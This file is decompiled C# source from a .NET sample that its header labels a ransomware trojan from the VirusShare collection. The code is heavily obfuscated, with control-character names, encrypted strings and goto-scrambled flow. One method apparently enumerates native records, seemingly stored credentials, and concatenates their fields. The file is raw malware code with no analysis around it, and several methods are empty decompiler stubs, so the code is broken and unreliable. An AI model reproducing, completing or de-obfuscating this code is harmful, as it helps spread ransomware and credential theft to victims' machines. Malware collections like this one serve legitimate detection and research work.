// Decompiled with JetBrains decompiler
// Type: .
// Assembly: LLS, Version=2.24.9.7, Culture=neutral, PublicKeyToken=null
// MVID: 5D6D71DE-8D40-4460-ABF9-23365541871A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-eaa908bb12fef0827442be70b4421db585c6c2d8b0ee62f8245856740ea6a776.exe

using \u0003\u000E;
using \u000E;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace \u0003\u000E
{
  internal sealed class \u0016\u000E
  {
    public static string \u0001;

    public class \u0012\u0004
    {
      [DebuggerNonUserCode]
      public \u0012\u0004()
      {
      }

      internal bool \u0006\u0003(
        [In] ref \u0016\u000E.\u0012\u0004.\u0013\u0004 obj0,
        [In] int obj1,
        [In] int obj2,
        [In] int obj3,
        [In] int obj4,
        [In] int obj5,
        [In] ref \u0016\u000E.\u0012\u0004.\u0013\u0004 obj6)
      {
        bool flag;
        return flag;
      }

      private bool \u0010\u0004([In] string obj0, [In] int obj1, [In] ref int obj2, [In] ref IntPtr obj3)
      {
        bool flag;
        return flag;
      }

      public object \u0011\u0004()
      {
        string str1 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(3966), \u0008.\u0007(217));
        if (true)
          goto label_23;
label_1:
        if (true)
          goto label_24;
label_2:
        IntPtr zero = IntPtr.Zero;
        if (true)
          goto label_25;
label_3:
        if (true)
          goto label_26;
label_4:
        int num1;
        IntPtr num2;
        int num3 = this.\u0010\u0004(\u0007\u000E.\u0006\u000E(\u0008.\u0007(3975), \u0008.\u0007(217)), 0, ref num1, ref num2) ? 1 : 0;
        if (true)
          goto label_27;
label_5:
        bool flag;
        IntPtr[] numArray1;
        string str2;
        try
        {
          if (flag)
          {
            IntPtr[] numArray2 = new IntPtr[num1 - 1 + 1];
            if (true)
              goto label_20;
label_7:
            IntPtr num4 = num2;
            int num5 = 0;
            int num6 = num1 - 1;
            int index;
            if (true)
              index = num5;
            else
              goto label_18;
label_17:
            num5 = index;
label_18:
            int num7 = num6;
            if (num5 <= num7)
            {
              numArray1[index] = \u001E\u0002.\u001B\u0003(\u009C.\u0093\u0002(num4.ToInt32() + \u009B.\u0091\u0002() * index));
              // ISSUE: type reference
              \u0016\u000E.\u0012\u0004.\u0014\u0004 obj1 = (\u0016\u000E.\u0012\u0004.\u0014\u0004) \u009D.\u0094\u0002(numArray1[index], \u0017.\u0089(__typeref (\u0016\u000E.\u0012\u0004.\u0014\u0004)));
              \u0016\u000E.\u0012\u0004.\u0013\u0004 obj2;
              string[] strArray;
              if (true)
              {
                if (true)
                {
                  obj2 = new \u0016\u000E.\u0012\u0004.\u0013\u0004();
                  \u0016\u000E.\u0012\u0004.\u0013\u0004 obj3 = new \u0016\u000E.\u0012\u0004.\u0013\u0004();
                  obj2.\u0002 = obj1.\u0007;
                  obj2.\u0001 = \u001F\u0002.\u001C\u0003(obj1.\u0006);
                  if (true)
                  {
                    this.\u0006\u0003(ref obj2, 0, 0, 0, 0, 1, ref obj3);
                    strArray = new string[9];
                    strArray[0] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(4016), \u0008.\u0007(217));
                    strArray[1] = \u0008.\u0007(822);
                  }
                  else
                    goto label_15;
                }
                else
                  goto label_14;
              }
              strArray[2] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(4077), \u0008.\u0007(217));
              strArray[3] = \u0013\u0002.\u0007\u0003(obj1.\u0011);
              strArray[4] = \u0008.\u0007(848);
              strArray[5] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(3410), \u0008.\u0007(217));
label_14:
              strArray[6] = \u0013\u0002.\u0007\u0003(obj2.\u0002);
label_15:
              if (true)
              {
                strArray[7] = \u0008.\u0007(822);
                strArray[8] = \u0007\u000E.\u0006\u000E(\u0008.\u0007(2753), \u0008.\u0007(217));
                str2 = \u0012.\u0080(strArray);
                ++index;
                goto label_17;
              }
              else
                goto label_22;
            }
            else
            {
              \u0016\u000E.\u0001 = str2;
              goto label_22;
            }
label_20:
            numArray1 = numArray2;
            goto label_7;
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          \u0016\u000E.\u0001 = \u0007\u000E.\u0006\u000E(\u0008.\u0007(3966), \u0008.\u0007(217));
          \u0014.\u0082();
        }
label_22:
        object obj;
        return obj;
label_27:
        flag = num3 != 0;
        goto label_5;
label_26:
        numArray1 = (IntPtr[]) null;
        goto label_4;
label_25:
        num2 = zero;
        goto label_3;
label_24:
        num1 = 0;
        goto label_2;
label_23:
        str2 = str1;
        goto label_1;
      }

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
      public struct \u0013\u0004
      {
        public int \u0001;
        public IntPtr \u0002;
      }

      private struct \u0014\u0004
      {
        public IntPtr \u0001;
        public IntPtr \u0002;
        public IntPtr \u0003;
        public IntPtr \u0004;
        public System.Runtime.InteropServices.ComTypes.FILETIME \u0005;
        public IntPtr \u0006;
        public IntPtr \u0007;
        public IntPtr \u0008;
        public IntPtr \u000E;
        public IntPtr \u000F;
        public IntPtr \u0010;
        public IntPtr \u0011;
      }
    }
  }
}
